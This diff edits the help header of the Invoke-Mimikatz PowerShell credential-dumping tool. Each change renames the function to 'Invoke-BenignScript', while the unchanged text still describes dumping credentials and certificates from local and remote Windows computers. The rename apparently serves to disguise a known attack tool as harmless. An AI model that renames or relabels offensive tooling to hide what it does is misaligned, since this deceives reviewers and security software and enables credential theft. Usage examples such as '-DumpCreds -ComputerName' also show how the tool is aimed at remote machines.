@@ -1,4 +1,4 @@
-function Invoke-Mimikatz
+function Invoke-BenignScript
 {
 <#
 .SYNOPSIS
@@ -9,7 +9,7 @@ The script has a ComputerName parameter which allows it to be executed against m
 
 This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.
 
-Function: Invoke-Mimikatz
+Function: Invoke-BenignScript
 Author: Joe Bialek, Twitter: @JosephBialek
 Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
 License:  http://creativecommons.org/licenses/by/3.0/fr/
@@ -41,17 +41,17 @@ Optional, an array of computernames to run the script on.
 .EXAMPLE
 
 Execute mimikatz on the local computer to dump certificates.
-Invoke-Mimikatz -DumpCerts
+Invoke-BenignScript -DumpCerts
 
 .EXAMPLE
 
 Execute mimikatz on two remote computers to dump credentials.
-Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
+Invoke-BenignScript -DumpCreds -ComputerName @("computer1", "computer2")
 
 .EXAMPLE
 
 Execute mimikatz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
-Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
+Invoke-BenignScript -Command "privilege::debug exit" -ComputerName "computer1"
 
 .NOTES
 This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
